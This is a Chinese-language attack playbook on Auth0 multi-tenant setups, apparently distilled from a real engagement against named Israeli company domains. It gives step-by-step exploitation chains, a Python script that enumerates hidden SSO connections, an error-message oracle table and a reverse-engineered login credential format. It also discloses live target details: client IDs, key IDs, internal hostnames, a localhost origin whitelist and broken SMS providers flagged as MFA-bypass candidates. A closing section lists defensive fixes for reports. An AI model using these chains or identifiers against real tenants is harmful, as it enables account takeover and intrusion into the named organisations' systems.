# Auth0 多租户攻击面模式总结

> 从 xnes.co.il/fnx.co.il 实战蒸馏：8 套 Auth0 配置完全暴露过程中学到的攻击模式。

## Auth0 攻击面全景

```
Auth0 攻击面 = 租户 × 连接 × 自定义域 × 客户端
每增加一个维度，攻击面指数级扩大。
```

## 模式 1：QA 租户暴露于生产配置

**识别信号**：
- 页面 JS 含 `auth0Domain` 或 `AUTH0_DOMAIN` 指向 `*-qa.*.auth0.com`
- Nuxt/Next.js `__NUXT_DATA__` 或 `window.__NEXT_DATA__` 含 auth0 配置
- 前端 env 文件意外包含 QA 域名

**利用链**：
```
1. 从生产页面提取 QA Auth0 域 + client_id
2. GET /.well-known/openid-configuration → 完整端点列表
3. GET /.well-known/jwks.json → RS256 公钥（kid 值）
4. POST /dbconnections/change_password → 测试 connection 是否存在
5. POST /co/authenticate → 测试不同 Origin → 发现 localhost 白名单
6. GET /u/login?state=xxx → QA 登录页面通常无 CAPTCHA/限速
7. QA 的 SMS/Email provider 可能失效 → MFA 绕过
```

**本案实例**：
```
生产站 www.fnx.co.il → Nuxt 配置含 fnx-qa.eu.auth0.com
→ QA client_id: Ks02vA8GwER8zZCNAufwKNi87twazT2Q
→ PersonalInfoDB 完整协议逆向
→ Twilio SMS 凭据失效（QA 环境维护差）
→ localhost:3000 在 Web Origin 白名单
```

## 模式 2：OIDC 自定义域独立攻击面

**识别信号**：
- 多个域名指向同一 Auth0 租户但各有 `/.well-known/openid-configuration`
- JWKS kid 值不同 = 不同的密钥对 = 独立 OIDC 提供者
- Auth0 自定义域格式：`login.company.com`、`auth.company.com`

**方法**：
```
对每个疑似 Auth0 域：
  GET /.well-known/openid-configuration
  GET /.well-known/jwks.json
  比较 kid 值 → kid 不同 = 独立提供者
  
  每个独立提供者检查：
  - token_endpoint_auth_methods_supported: 含 "none" = 公开客户端支持
  - 是否有 device_authorization_endpoint（设备码流）
  - 是否有 backchannel_authentication_endpoint（CIBA）
  - 是否有 registration_endpoint（DCR）
```

**本案实例**：
```
5 个独立 OIDC 提供者，每个有不同的 JWKS kid：
  claims-login-qa.fnx.co.il  → kid: wahBtGcnsmrUd19H1lDni
  pinfo-login-qa.fnx.co.il   → kid: 6LXNpn252YyhNkrZxPndS
  login.fnx.co.il             → kid: Nv_0g-Vw_5M4Z-IGe-5GM
  login-doctors.fnx.co.il     → kid: 1I6-MVkVqzjq2_SMAk9Bg
  claims-login.fnx.co.il      → kid: (未提取)
```

## 模式 3：alternate_connections 暴露内部 SSO

**识别信号**：
- Auth0 `/authorize` 支持 `connection` 参数
- 不同 connection 名 302 到不同系统

**方法**：
```python
connections_to_try = [
    'sso', 'saml', 'adfs', 'azure-ad', 'google-oauth2',
    'facebook', 'apple', 'github', 'linkedin', 'twitter',
    'stargate', 'internal', 'corporate', 'employee',
    'Username-Password-Authentication', 'email', 'sms',
    # 公司名变体
    'company-sso', 'company-ad', 'company-saml'
]

for conn in connections_to_try:
    r = requests.get(f"https://{auth0_domain}/authorize?"
        f"response_type=code&client_id={client_id}&"
        f"redirect_uri={callback}&connection={conn}&scope=openid",
        allow_redirects=False)
    if r.status_code == 302:
        location = r.headers.get('Location', '')
        # 分析重定向目标 → 发现新系统
```

**本案实例**：
```
connection=stargate → 302 → stargate.fnx.co.il（自定义 OAuth2 SSO）
connection=sso      → 302 → fnx-sso.eu.auth0.com（第四个 Auth0 租户！）
                          → 新 client_id: KsejRzjlTUCmTV9xyuvLyFXhdFnjSg2G
```

## 模式 4：错误信息差异映射

**关键差异矩阵**：

| 请求 | 错误信息 | 含义 |
|------|---------|------|
| /co/authenticate wrong origin | `Origin is not allowed` | Origin 白名单存在 |
| /co/authenticate correct origin | `Wrong email or password` | Connection 有效 |
| /dbconnections/signup | `Please implement the Get User script` | 自定义 DB 只有 Login |
| /dbconnections/change_password | `Please implement the Get User script` | 密码重置功能损坏 |
| /oauth/token password grant | `unauthorized_client` | 密码 grant 未对该客户端启用 |
| /oauth/token password grant | `Grant type not allowed` | 租户级别禁用 |
| /authorize wrong client_id | `Unknown client` | client_id 不存在于该租户 |
| /authorize cross-domain | `Invalid domain` | client_id 存在但域不匹配 |
| /passwordless/start sms | `sms_provider_error` | SMS 提供商凭据失效 |
| /passwordless/start email | `Email connection is disabled` | 邮件连接已禁用 |

## 模式 5：Auth0 自定义数据库协议逆向

**识别信号**：
- Connection 类型不是标准的 `Username-Password-Authentication`
- 自定义名称如 `PersonalInfoDB`、`CustomUsers`、`LegacyDB`
- `/dbconnections/signup` 返回非标准错误

**逆向方法**：
```
1. 访问 /u/login 登录页面 → 查看 HTML 源码
2. 找到 Auth0 Lock 或自定义 JS → 分析 webAuth.login() 调用
3. 关注 realm 参数 = connection 名
4. 分析 username/password 构造逻辑
5. 查看 _csrf token 和 callbackURL
6. 浏览器 CDP 提取 Base64 编码的 config 对象
```

**本案 PersonalInfoDB 协议**：
```javascript
realm = 'PersonalInfoDB'
username = israeliID + channelSuffix  // "123456789s" (s=SMS, c=Call, e=Email)
password = <REDACTED> + "&" + idType + "&" + mc + "&" + channel).toLowerCase()
// 示例: "0549893455&id&&sms"
```

## 多租户攻击面指数计算

```
本案：
  租户数：4 (qa, prod, sso, aux)
  自定义域：5 (claims-login-qa, pinfo-login-qa, login, login-doctors, claims-login)
  客户端数：3 (QA, Prod, SSO)
  连接数：4 (PersonalInfoDB, sms, email, Username-Password-Authentication)
  
  理论攻击面 = 4 × 5 × 3 × 4 = 240 种组合
  实际有效组合：约 15-20 种（大部分跨租户无效）
  
  但每个有效组合都是独立的攻击路径：
  - QA + PersonalInfoDB + SMS Provider 失效 = MFA 绕过候选
  - SSO + Username-Password-Auth + Get User 未实现 = 密码重置失效
  - Prod + 跨域 client_id + Invalid domain = 租户映射泄露
```

## 防御建议（写报告时用）

1. **QA Auth0 配置不应出现在生产 JS 中** — 使用构建时环境变量替换
2. **每个 Auth0 租户应有独立的密钥管理** — 避免 QA 密钥泄露影响生产
3. **Custom DB 应实现所有脚本** — Get User 未实现导致密码重置功能损坏
4. **SMS Provider 凭据应定期轮换** — QA 环境的 Twilio 凭据失效是常见问题
5. **Web Origin 白名单不应包含 localhost** — 即使是 QA 租户
6. **OIDC Discovery 端点应限制访问** — 或至少不暴露 CIBA/DCR 端点
7. **alternate_connections 应限制范围** — 不应暴露内部 SSO 系统名称
